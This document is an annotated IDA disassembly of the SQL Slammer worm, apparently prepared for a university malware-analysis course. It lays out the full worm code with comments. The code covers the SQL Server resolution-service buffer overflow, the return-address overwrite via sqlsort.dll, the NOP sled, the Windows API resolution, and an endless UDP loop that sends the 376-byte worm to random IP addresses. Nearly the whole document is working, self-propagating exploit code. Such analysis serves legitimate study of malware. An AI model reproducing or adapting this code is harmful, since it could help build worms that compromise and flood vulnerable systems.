seg000:00000000 ;
seg000:00000000 ; +-------------------------------------------------------------------------+
seg000:00000000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:00000000 ; |           Copyright (c) 2023 Hex-Rays, <support@hex-rays.com>           |
seg000:00000000 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:00000000 ; |                     Georgia Institute of Technology                     |
seg000:00000000 ; +-------------------------------------------------------------------------+
seg000:00000000 ;
seg000:00000000 ; Input SHA256 : 4F22864414F474843EB1E4599185E31D51C5B4AEFDE63B4DC5A850A39AEFF3CB
seg000:00000000 ; Input MD5    : A0AA4A74B70CBCA5A03960DF1A3DC878
seg000:00000000 ; Input CRC32  : 4660912C
seg000:00000000
seg000:00000000 ; ---------------------------------------------------------------------------
seg000:00000000 ; File Name   : /nethome/gweese3/W32.SQLSlammer.worm
seg000:00000000 ; Format      : Binary file
seg000:00000000 ; Base Address: 0000h Range: 0000h - 0178h Loaded length: 0178h
seg000:00000000
seg000:00000000                 .686p
seg000:00000000                 .mmx
seg000:00000000                 .model flat
seg000:00000000
seg000:00000000 ; ===========================================================================
seg000:00000000
seg000:00000000 ; Segment type: Pure code
seg000:00000000 seg000          segment byte public 'CODE' use32
seg000:00000000                 assume cs:seg000
seg000:00000000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:00000000                 add     al, 1           ; x04 is a byte value that causes sql server to take the following and plug it into a buffer.
seg000:00000000                                         ;
seg000:00000000                                         ; As a part of opening the buffer, sql server will unsafe string copy which means the worm can overwrite the ret address, causing the worm to actually execute
seg000:00000000 ; ---------------------------------------------------------------------------
seg000:00000002                 db    1                 ; Following is byte padding to actually proc the buffer overflow
seg000:00000003                 db    1
seg000:00000004                 db    1
seg000:00000005                 db    1
seg000:00000006                 db    1
seg000:00000007                 db    1
seg000:00000008                 db    1
seg000:00000009                 db    1
seg000:0000000A                 db    1
seg000:0000000B                 db    1
seg000:0000000C                 db    1
seg000:0000000D                 db    1
seg000:0000000E                 db    1
seg000:0000000F                 db    1
seg000:00000010                 db    1
seg000:00000011                 db    1
seg000:00000012                 db    1
seg000:00000013                 db    1
seg000:00000014                 db    1
seg000:00000015                 db    1
seg000:00000016                 db    1
seg000:00000017                 db    1
seg000:00000018                 db    1
seg000:00000019                 db    1
seg000:0000001A                 db    1
seg000:0000001B                 db    1
seg000:0000001C                 db    1
seg000:0000001D                 db    1
seg000:0000001E                 db    1
seg000:0000001F                 db    1
seg000:00000020                 db    1
seg000:00000021                 db    1
seg000:00000022                 db    1
seg000:00000023                 db    1
seg000:00000024                 db    1
seg000:00000025                 db    1
seg000:00000026                 db    1
seg000:00000027                 db    1
seg000:00000028                 db    1
seg000:00000029                 db    1
seg000:0000002A                 db    1
seg000:0000002B                 db    1
seg000:0000002C                 db    1
seg000:0000002D                 db    1
seg000:0000002E                 db    1
seg000:0000002F                 db    1
seg000:00000030                 db    1
seg000:00000031                 db    1
seg000:00000032                 db    1
seg000:00000033                 db    1
seg000:00000034                 db    1
seg000:00000035                 db    1
seg000:00000036                 db    1
seg000:00000037                 db    1
seg000:00000038                 db    1
seg000:00000039                 db    1
seg000:0000003A                 db    1
seg000:0000003B                 db    1
seg000:0000003C                 db    1
seg000:0000003D                 db    1
seg000:0000003E                 db    1
seg000:0000003F                 db    1
seg000:00000040                 db    1
seg000:00000041                 db    1
seg000:00000042                 db    1
seg000:00000043                 db    1
seg000:00000044                 db    1
seg000:00000045                 db    1
seg000:00000046                 db    1
seg000:00000047                 db    1
seg000:00000048                 db    1
seg000:00000049                 db    1
seg000:0000004A                 db    1
seg000:0000004B                 db    1
seg000:0000004C                 db    1
seg000:0000004D                 db    1
seg000:0000004E                 db    1
seg000:0000004F                 db    1
seg000:00000050                 db    1
seg000:00000051                 db    1
seg000:00000052                 db    1
seg000:00000053                 db    1
seg000:00000054                 db    1
seg000:00000055                 db    1
seg000:00000056                 db    1
seg000:00000057                 db    1
seg000:00000058                 db    1
seg000:00000059                 db    1
seg000:0000005A                 db    1
seg000:0000005B                 db    1
seg000:0000005C                 db    1
seg000:0000005D                 db    1
seg000:0000005E                 db    1
seg000:0000005F                 db    1
seg000:00000060                 db    1
seg000:00000061 ; ---------------------------------------------------------------------------
seg000:00000061                 fmul    st(1), st       ; Address of jump esp that is overwritten in sqlsort(42B0C9DC)
seg000:00000063                 mov     al, 42h ; 'B'
seg000:00000065                 jmp     short wormstart ; This is the next byte of the stack after the stack overflow
seg000:00000065 ; ---------------------------------------------------------------------------
seg000:00000067                 db    1
seg000:00000068                 db    1
seg000:00000069                 db    1
seg000:0000006A                 db    1
seg000:0000006B                 db    1
seg000:0000006C                 db    1
seg000:0000006D                 db    1
seg000:0000006E                 db  70h ; p             ; Fake values to get ssnetlib to continue executing before the ret
seg000:0000006F                 db 0AEh
seg000:00000070                 db  42h ; B
seg000:00000071                 db    1
seg000:00000072                 db  70h ; p
seg000:00000073                 db 0AEh
seg000:00000074                 db  42h ; B
seg000:00000075 ; ---------------------------------------------------------------------------
seg000:00000075
seg000:00000075 wormstart:                              ; CODE XREF: seg000:00000065↑j
seg000:00000075                 nop                     ; no-op sled and the beginning of the actual worm code
seg000:00000076                 nop                     ; Due to ssnetlib incrementing, this value for the buffer overflow of the jump offset could be further than this, hence the nop sled to get to the accurate start
seg000:00000077                 nop
seg000:00000078                 nop
seg000:00000079                 nop
seg000:0000007A                 nop
seg000:0000007B                 nop
seg000:0000007C                 nop
seg000:0000007D                 push    42B0C9DCh       ; JUMP ESP (in sqlsort.dll)
seg000:00000082                 mov     eax, 1010101h   ; eax= 1010101h
seg000:00000087                 xor     ecx, ecx        ; ecx = 0h
seg000:00000089                 mov     cl, 18h         ; cx = 18h
seg000:0000008B
seg000:0000008B add_buffer:                             ; CODE XREF: seg000:0000008C↓j
seg000:0000008B                 push    eax             ; rebuild buffer continually
seg000:0000008C                 loop    add_buffer      ; Loop until ecx = 0, pushing the 21 x01s onto the stack because they have been consumed in the buffer overload
seg000:0000008E                 xor     eax, 5010101h   ; EAX  = 0x0400000, puts the 0x4 back that was consumed in the buffer overflow
seg000:0000008E                                         ;
seg000:0000008E                                         ; Weird trick because it can't use a 0
seg000:00000093                 push    eax             ; push this value
seg000:00000094                 mov     ebp, esp        ; Initialization, put ebp at the top of the stack
seg000:00000096                 push    ecx             ; PUSH 0h
seg000:00000097                 push    6C6C642Eh       ; Push string 'kernel32.dll'
seg000:00000097                                         ; '.dll'
seg000:0000009C                 push    32336C65h       ; 'el32'
seg000:000000A1                 push    6E72656Bh       ; 'kern'
seg000:000000A6                 push    ecx             ; push 0
seg000:000000A7                 push    746E756Fh       ; "GetTickCount"
seg000:000000A7                                         ; 'ount'
seg000:000000AC                 push    436B6369h       ; 'ickC'
seg000:000000B1                 push    54746547h       ; 'GetT'
seg000:000000B6                 mov     cx, 6C6Ch       ; Ecx = 00006C6ch
seg000:000000BA                 push    ecx             ; push 'll'
seg000:000000BB                 push    642E3233h       ; string "ws2_32.dll"
seg000:000000BB                                         ; '32.d'
seg000:000000C0                 push    5F327377h       ; 'ws2_'
seg000:000000C5                 mov     cx, 7465h       ; Ecx = 00007465h
seg000:000000C9                 push    ecx             ; string 'socket'
seg000:000000C9                                         ; 'et'
seg000:000000CA                 push    6B636F73h       ; 'sock'
seg000:000000CF                 mov     cx, 6F74h       ; ecx = 00006f74h
seg000:000000D3                 push    ecx             ; string 'sendto'
seg000:000000D3                                         ; 'to'
seg000:000000D4                 push    646E6573h       ; "send"
seg000:000000D9                 mov     esi, 42AE1018h  ; Call to ESI = 42AE1018h
seg000:000000D9                                         ; This is in sqlsort
seg000:000000D9                                         ;  Code is = HMODULE (__stdcall * LoadLibraryA)(LPCSTR 1pLibfilename)
seg000:000000D9                                         ;  extrn LoadLibraryA:dword
seg000:000000DE                 lea     eax, [ebp-2Ch]  ; Load address of ebp -44 = "ws2_32.dll"
seg000:000000E1                 push    eax             ; Add this address on the stack
seg000:000000E2                 call    dword ptr [esi] ; Pass the ws2_32.dll to the library argument in sqlsort
seg000:000000E4                 push    eax             ; Push the return result from  load library call
seg000:000000E5                 lea     eax, [ebp-20h]  ; Memory address of ebp-32
seg000:000000E5                                         ; "gettickcount'
seg000:000000E8                 push    eax             ; address of "gettickcount"
seg000:000000E9                 lea     eax, [ebp-10h]  ; ebp - 16
seg000:000000E9                                         ; 'kernel132.dll'
seg000:000000EC                 push    eax             ; Add string address to the stack
seg000:000000ED                 call    dword ptr [esi] ; Call loadlibrary to load kernel32.dll
seg000:000000EF                 push    eax             ; Add the library return on the stack
seg000:000000F0                 mov     esi, 42AE1010h  ; Get another function from SQLSort.dll
seg000:000000F0                                         ;
seg000:000000F0                                         ; FarProc (__stdcall * getProcaddress) (Hmodule, LPCstr lpprocname)
seg000:000000F0                                         ;
seg000:000000F0                                         ; Get address of the function from the DLL
seg000:000000F5                 mov     ebx, [esi]      ; Ebx = value getprocaddress()
seg000:000000F7                 mov     eax, [ebx]      ; eax = getprocaddress()
seg000:000000F9                 cmp     eax, 51EC8B55h  ; Is this sql serger pack 1 or 2? Address varies slightly
seg000:000000FE                 jz      short virusexecution ; Skip the library switch and go to execute the code
seg000:00000100                 mov     esi, 42AE101Ch  ; Try to load Findresource to be used instead
seg000:00000100                                         ;
seg000:00000100                                         ; HRSRC (__stdcall *FindresourceA)(Hmodule hmodule, LPCStr lpname, LPCSTR lptype)
seg000:00000100                                         ; extern FindresourceA:dword
seg000:00000105
seg000:00000105 virusexecution:                         ; CODE XREF: seg000:000000FE↑j
seg000:00000105                 call    dword ptr [esi] ; Call getprocaddress('kernel32.dll', 'GetTickCount')
seg000:00000107                 call    eax             ; Call return value(was placed in eax)
seg000:00000107                                         ; Means calling address of GetTickCount();
seg000:00000109                 xor     ecx, ecx        ; ecx= 0
seg000:0000010B                 push    ecx             ; push 0
seg000:0000010C                 push    ecx             ; push 0
seg000:0000010D                 push    eax             ; Push gettick count result, used for rng later
seg000:0000010E                 xor     ecx, 9B040103h  ; same as a move
seg000:0000010E                                         ; ecx = 9B040103h
seg000:00000114                 xor     ecx, 1010101h   ; ecx = 9a050002
seg000:0000011A                 push    ecx             ; push value onto the stack(port 1434)
seg000:0000011B                 lea     eax, [ebp-34h]  ; ebp - 52
seg000:0000011B                                         ; "socket"
seg000:0000011E                 push    eax             ; "socket" on the stack
seg000:0000011F                 mov     eax, [ebp-40h]  ; ebp - 64
seg000:0000011F                                         ; ws2_32.dll
seg000:00000122                 push    eax             ; ws2_32.DLL ON THE STACK
seg000:00000123                 call    dword ptr [esi] ; Get procaddress(ws2_32.dll, 'socket')
seg000:00000125                 push    11h             ; Set protocol - UDP
seg000:00000127                 push    2               ; Use socket datagrams- uses UDP
seg000:00000129                 push    2               ; AF_INET- Use IPv4
seg000:0000012B                 call    eax             ; Call socket function with previously set parameters
seg000:0000012D                 push    eax             ; Put result on the stack
seg000:0000012E                 lea     eax, [ebp-3Ch]  ; ebp -60
seg000:0000012E                                         ; Address "sendto"
seg000:00000131                 push    eax             ; address on the stack
seg000:00000132                 mov     eax, [ebp-40h]  ; ebp-64
seg000:00000132                                         ; "ws2_32.dll"
seg000:00000135                 push    eax             ; on the stack
seg000:00000136                 call    dword ptr [esi] ; Call getprocaddress "sendto" function
seg000:00000138                 mov     esi, eax        ; ESI = address of sendto
seg000:0000013A                 or      ebx, ebx        ; Is this supposed to be an xor??
seg000:0000013A                                         ; Maybe a bug, breaks the ip address rng
seg000:0000013C                 xor     ebx, 0FFD9613Ch ; ebx = FFD9613h
seg000:00000142
seg000:00000142 Propagate:                              ; CODE XREF: seg000:00000176↓j
seg000:00000142                 mov     eax, [ebp-4Ch]  ; GET RANDOM SEED AND PLACE IT INTO EAX
seg000:00000145                 lea     ecx, [eax+eax*2] ; Ecx = eax*3
seg000:00000148                 lea     edx, [eax+ecx*4] ; edx = eax + ecx*4 = (eax*3)*4 + eax = eax*13
seg000:0000014B                 shl     edx, 4          ; bitshift left 4 edx
seg000:0000014E                 add     edx, eax        ; edx +=eax
seg000:00000150                 shl     edx, 8          ; edx <<8
seg000:00000153                 sub     edx, eax        ; edx - eax = edx
seg000:00000155                 lea     eax, [eax+edx*4] ; eax += edx * 5
seg000:00000158                 add     eax, ebx        ; eax += ebx
seg000:0000015A                 mov     [ebp-4Ch], eax  ; new seed for randomization
seg000:0000015D                 push    10h             ; sendto looks like this
seg000:0000015D                                         ; sendto(
seg000:0000015D                                         ; Socket s,
seg000:0000015D                                         ; const char FAR * bug
seg000:0000015D                                         ; int len,
seg000:0000015D                                         ; int flags,
seg000:0000015D                                         ; const struct sockaddr FAR *to,
seg000:0000015D                                         ; int tolen
seg000:0000015D                                         ; );
seg000:0000015D                                         ;
seg000:0000015D                                         ; This line sets sizeof(struct sockaddr_in)
seg000:0000015F                 lea     eax, [ebp-50h]  ; ebp -50h
seg000:0000015F                                         ; gettickcount
seg000:00000162                 push    eax             ; Target address
seg000:00000163                 xor     ecx, ecx        ; ECX =0
seg000:00000165                 push    ecx             ; Send flags
seg000:00000166                 xor     cx, 178h        ; ECX = 178h, 376 bytes
seg000:0000016B                 push    ecx             ; Packet length is 376 bytes
seg000:0000016C                 lea     eax, [ebp+3]    ; EBP + 3
seg000:0000016C                                         ; Worm in buffer, +3 so you get over the zeros in the stack and go to the command code 0x4
seg000:0000016F                 push    eax             ; push address of the worm
seg000:00000170                 mov     eax, [ebp-54h]  ; use sockets previously set up in the code
seg000:00000173                 push    eax             ; Add socket function with input variables to the code
seg000:00000174                 call    esi             ; send worm to a random ip address
seg000:00000176                 jmp     short Propagate ; Loop and continue firing virus out to random iPs
seg000:00000176 seg000          ends
seg000:00000176
seg000:00000176
seg000:00000176                 end
